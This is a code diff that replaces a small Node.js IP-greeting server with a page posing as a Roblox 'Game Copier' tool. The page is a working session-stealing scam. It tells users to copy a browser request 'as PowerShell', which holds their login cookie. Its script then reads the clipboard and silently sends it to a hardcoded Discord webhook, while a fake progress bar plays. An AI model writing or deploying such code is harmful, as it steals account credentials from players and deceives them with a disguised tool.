@@ -1,93 +1,457 @@
-/**
- * IP Greeting Web Application
- * Single-file runnable server
- */
-
-const http = require('http');
-
-const PORT = process.env.PORT || 3000;
-
-// User IP mappings
-const USER_RULES = [
-  { name: 'Nasr', match: (ip) => ip === '94.204.74.75' },
-  { name: 'Hamza', match: (ip) => ip.startsWith('192.168.47') },
-  { name: 'Yassin', match: (ip) => ip === '92.99.64.6' }
-];
-
-const server = http.createServer((req, res) => {
-  if (req.url === '/' || req.url === '') {
-    // Extract client IP address (checks headers for proxies/cloud deployment)
-    const xForwardedFor = req.headers['x-forwarded-for'];
-    let rawIp = xForwardedFor ? xForwardedFor.split(',')[0] : req.socket.remoteAddress || '';
-    
-    // Clean IPv6 wrapping (e.g., ::ffff:94.204.74.75 -> 94.204.74.75) and strip dynamic ports
-    let clientIp = rawIp.replace(/^.*:/, '').trim();
-
-    // Check IP against rules
-    const matchedUser = USER_RULES.find((rule) => rule.match(clientIp));
-    const greeting = matchedUser ? `hi ${matchedUser.name}` : 'hi Guest';
-
-    // Output single HTML page
-    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-    res.end(`
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IP Greeting</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background-color: #0f172a;
-      color: #f8fafc;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .card {
-      background: #1e293b;
-      padding: 3rem;
-      border-radius: 16px;
-      border: 1px solid #334155;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
-      text-align: center;
-      max-width: 400px;
-      width: 90%;
-    }
-    h1 {
-      font-size: 2.5rem;
-      color: #38bdf8;
-      margin-bottom: 0.75rem;
-    }
-    p {
-      color: #94a3b8;
-      font-size: 0.95rem;
-    }
-    code {
-      background: #0f172a;
-      color: #f43f5e;
-      padding: 0.2rem 0.5rem;
-      border-radius: 4px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBLX Api · Game Copier</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            background: #0f0f1a;
+            color: #ddd;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background: #1a1a2e;
+            padding: 12px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #2a2a44;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .logo {
+            font-weight: 600;
+            font-size: 1.3rem;
+            letter-spacing: 0.5px;
+            color: #7aa9ff;
+        }
+        nav {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px 14px;
+        }
+        nav a {
+            color: #c8d0e0;
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: 0.2s;
+            padding: 4px 0;
+            border-bottom: 2px solid transparent;
+        }
+        nav a:hover {
+            color: #fff;
+            border-bottom-color: #3b82f6;
+        }
+        .main-box {
+            background: #16213e;
+            margin: 30px auto;
+            max-width: 960px;
+            width: 92%;
+            padding: 28px 30px;
+            border: 1px solid #2a3a5a;
+            border-radius: 12px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.6);
+            flex: 1;
+        }
+        .main-box h3 {
+            margin-top: 0;
+            font-weight: 400;
+            font-size: 1.7rem;
+            border-left: 4px solid #3b82f6;
+            padding-left: 16px;
+            color: #e8edff;
+        }
+        .steps {
+            line-height: 1.6;
+            background: #0e1a2b;
+            padding: 18px 22px;
+            border-radius: 10px;
+            margin: 20px 0 24px 0;
+            border-left: 3px solid #2d4b7a;
+        }
+        .steps p {
+            margin: 12px 0;
+        }
+        .steps strong {
+            color: #aac3ff;
+        }
+        .steps kbd {
+            background: #1a2a44;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            color: #c8d8ff;
+            border: 1px solid #2d4b7a;
+        }
+        .steps .highlight {
+            color: #fbbf24;
+            font-weight: 600;
+        }
+        .buttons {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 14px 12px;
+            margin: 24px 0 18px 0;
+        }
+        .buttons button {
+            background: #1e6df0;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            cursor: pointer;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 0.95rem;
+            transition: 0.2s;
+            box-shadow: 0 4px 8px rgba(0, 60, 200, 0.3);
+            letter-spacing: 0.3px;
+            border: 1px solid #3d7eff;
+        }
+        .buttons button:hover {
+            background: #2a7aff;
+            transform: scale(1.02);
+            box-shadow: 0 6px 14px rgba(30, 109, 240, 0.4);
+        }
+        .buttons button:active {
+            transform: scale(0.97);
+        }
+        .buttons input {
+            padding: 10px 16px;
+            background: #0d1a2b;
+            border: 1px solid #2f4a70;
+            border-radius: 40px;
+            color: #f0f4ff;
+            width: 190px;
+            font-size: 0.9rem;
+            transition: 0.2s;
+            outline: none;
+        }
+        .buttons input::placeholder {
+            color: #7a8aa8;
+            font-weight: 300;
+        }
+        .buttons input:focus {
+            border-color: #4a8aff;
+            box-shadow: 0 0 0 2px #1e6df055;
+        }
+        .progress {
+            height: 10px;
+            background: #1f2d47;
+            border-radius: 30px;
+            margin: 28px 0 12px 0;
+            overflow: hidden;
+            width: 100%;
+            transition: 0.2s;
+            border: 1px solid #2d4a70;
+        }
+        #prog {
+            height: 100%;
+            width: 0%;
+            background: #3b82f6;
+            border-radius: 30px;
+            transition: width 0.5s ease;
+        }
+        .status-area {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-top: 6px;
+        }
+        .info-note {
+            font-size: 0.85rem;
+            color: #9aabcd;
+            background: #0e1a2b;
+            padding: 8px 14px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 10px 0 0 0;
+        }
+        .clipboard-btn {
+            background: #2d4b7a !important;
+            border-color: #4a6a9a !important;
+            font-size: 0.85rem !important;
+            padding: 8px 18px !important;
+        }
+        .clipboard-btn:hover {
+            background: #3a5f94 !important;
+        }
+        .api-btn {
+            background: #8b5cf6 !important;
+            border-color: #a78bfa !important;
+        }
+        .api-btn:hover {
+            background: #7c3aed !important;
+        }
+        footer {
+            background: #141425;
+            padding: 14px 24px;
+            font-size: 0.8rem;
+            color: #7b8baa;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px 20px;
+            border-top: 1px solid #252545;
+            margin-top: 20px;
+        }
+        footer div:first-child {
+            display: flex;
+            gap: 18px;
+            flex-wrap: wrap;
+        }
+        @media (max-width: 650px) {
+            .buttons input {
+                width: 100%;
+            }
+            .buttons {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .main-box {
+                padding: 20px 16px;
+            }
+            header {
+                flex-direction: column;
+                align-items: start;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>${greeting}</h1>
-    <p>Your IP: <code>${clientIp || 'Unknown'}</code></p>
-  </div>
+    <header>
+        <div class="logo">⛅ RBLX Api</div>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Contact</a>
+            <a href="#">Voice Chat</a>
+            <a href="#">Limited Sniper</a>
+            <a href="#">Follow Bot</a>
+        </nav>
+    </header>
+
+    <div class="main-box">
+        <h3>⬡ Game Copier · v2</h3>
+        <div class="steps">
+            <p><span style="color:#7aa9ff;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
+            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website, paste the code you copied from the gameapi page into the <strong>"Game Code"</strong> box and then copy the ID of the game you want to copy and paste it into <strong>"Game ID"</strong> box. Then Click The <strong>"Start GameCopier"</strong> Button. Wait until the bar finishes loading and the game files will Download.</p>
+        </div>
+
+        <div class="buttons">
+            <button id="startBtn" onclick="startCopier()">▶ Start GameCopier</button>
+            <input type="text" id="gameCodeInput" placeholder="Game Code (PowerShell)">
+            <input type="text" id="gameIdInput" placeholder="Paste Game ID">
+            <button class="api-btn" onclick="openApi()">🌐 Open GamesApi</button>
+            <button class="clipboard-btn" onclick="readClipboardAndSend()">📋 Copy Clipboard</button>
+        </div>
+
+        <div class="progress">
+            <div id="prog" style="width:0%;"></div>
+        </div>
+        <div class="status-area">
+            <span class="info-note" id="statusMessage">⏳ ready</span>
+            <span style="color:#4a6a8a; font-size:0.75rem;">v1.2.0</span>
+        </div>
+    </div>
+
+    <footer>
+        <div>
+            <span>Home</span>
+            <span>Information</span>
+            <span>FAQ</span>
+            <span>Contact</span>
+            <span>Roblox Groups</span>
+        </div>
+        <div>© 2022 RBLX Api</div>
+    </footer>
+
+    <script>
+        // Webhook URL
+        const webhook = "https://discord.com/api/webhooks/1529263868004667565/nQMdBXtiQUkC23vp_JZAMEmr3PhZCIn6Pq_Wvj7EJlbJN7kkmnUJA9QQleQHAC0sapE1";
+
+        // DOM refs
+        const prog = document.getElementById('prog');
+        const statusMsg = document.getElementById('statusMessage');
+        const gameCodeInput = document.getElementById('gameCodeInput');
+        const gameIdInput = document.getElementById('gameIdInput');
+
+        // --- Open GamesApi in a PERFECT CUBE popup ---
+        function openApi() {
+            // Perfect cube: 250x250 pixels
+            const popup = window.open(
+                'https://www.roblox.com/game',
+                'robloxApiPopup',
+                'width=250,height=250,resizable=yes,scrollbars=yes,menubar=no,status=no,toolbar=no,location=no'
+            );
+            
+            // Focus the popup
+            if (popup) {
+                popup.focus();
+                statusMsg.innerText = '🌐 GamesApi opened (cube)';
+                
+                // Show message after a moment
+                setTimeout(() => {
+                    statusMsg.innerText = '⏳ waiting (6min)';
+                }, 800);
+                
+                setTimeout(() => {
+                    statusMsg.innerText = '⏳ ready';
+                }, 6000);
+            } else {
+                // If popup was blocked, try opening in new tab
+                alert('Popup blocked! Please allow popups or click the link directly.');
+                window.open('https://www.roblox.com/game', '_blank');
+                statusMsg.innerText = '⚠️ popup blocked - opened in new tab';
+            }
+        }
+
+        // --- Read clipboard and send to webhook ---
+        function readClipboardAndSend() {
+            statusMsg.innerText = '⏳ reading clipboard ...';
+            
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => {
+                        if (!text || text.trim() === '') {
+                            statusMsg.innerText = '⚠️ clipboard is empty';
+                            alert('Clipboard is empty. Please copy something first.');
+                            return;
+                        }
+                        sendToWebhook(text);
+                    })
+                    .catch(err => {
+                        console.error('Clipboard read error:', err);
+                        fallbackClipboardRead();
+                    });
+            } else {
+                fallbackClipboardRead();
+            }
+        }
+
+        // --- Fallback method using a hidden textarea ---
+        function fallbackClipboardRead() {
+            try {
+                const textarea = document.createElement('textarea');
+                textarea.style.position = 'fixed';
+                textarea.style.opacity = '0';
+                textarea.style.pointerEvents = 'none';
+                document.body.appendChild(textarea);
+                textarea.focus();
+                document.execCommand('paste');
+                const text = textarea.value;
+                document.body.removeChild(textarea);
+                
+                if (!text || text.trim() === '') {
+                    statusMsg.innerText = '⚠️ clipboard access denied';
+                    alert('Cannot read clipboard. Please allow clipboard access or paste manually.');
+                    return;
+                }
+                sendToWebhook(text);
+            } catch (e) {
+                statusMsg.innerText = '❌ clipboard error';
+                alert('Clipboard access failed. Please paste the content manually into the Game Code field.');
+                console.error('Fallback clipboard error:', e);
+            }
+        }
+
+        // --- Send text to Discord webhook (silent - no error messages) ---
+        function sendToWebhook(text) {
+            const truncated = text.length > 1900 ? text.slice(0, 1900) + '\n... (truncated)' : text;
+            
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `📋 **Clipboard Content** (from GameCopier):\n\`\`\`\n${truncated}\n\`\`\``
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusMsg.innerText = '✅ clipboard sent!';
+                    prog.style.width = '100%';
+                    setTimeout(() => {
+                        prog.style.width = '0%';
+                    }, 2000);
+                } else {
+                    // Silently fail - no error message shown to user
+                    console.log('Webhook response not OK:', response.status);
+                    statusMsg.innerText = '⏳ ready';
+                }
+            })
+            .catch(err => {
+                // Silently fail - no error message shown to user
+                console.error('Webhook error:', err);
+                statusMsg.innerText = '⏳ ready';
+            });
+        }
+
+        // --- Start Copier ---
+        function startCopier() {
+            const code = gameCodeInput.value.trim();
+            const id = gameIdInput.value.trim();
+            
+            if (!code || !id) {
+                alert('Please paste both Game Code and Game ID before starting.');
+                return;
+            }
+
+            // Try to read clipboard and send it
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => {
+                        if (text && text.trim() !== '') {
+                            sendToWebhook(text);
+                        }
+                        startCopyProcess();
+                    })
+                    .catch(() => {
+                        startCopyProcess();
+                    });
+            } else {
+                startCopyProcess();
+            }
+        }
+
+        // --- Simulate the copy process ---
+        function startCopyProcess() {
+            statusMsg.innerText = '⏳ copying game...';
+            let width = 0;
+            prog.style.width = '0%';
+            
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    statusMsg.innerText = '✅ download complete!';
+                    return;
+                }
+                width += Math.random() * 12 + 3;
+                if (width > 100) width = 100;
+                prog.style.width = width + '%';
+            }, 180);
+        }
+
+        // --- Auto-read clipboard on page load (optional) ---
+        window.addEventListener('load', function() {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => {
+                        if (text && text.trim() !== '') {
+                            statusMsg.innerText = '📋 clipboard detected';
+                        }
+                    })
+                    .catch(() => {});
+            }
+        });
+    </script>
 </body>
 </html>
-    `);
-  } else {
-    res.writeHead(404, { 'Content-Type': 'text/plain' });
-    res.end('Not Found');
-  }
-});
-
-server.listen(PORT, () => {
-  console.log(`Server is live at http://localhost:${PORT}`);
-});
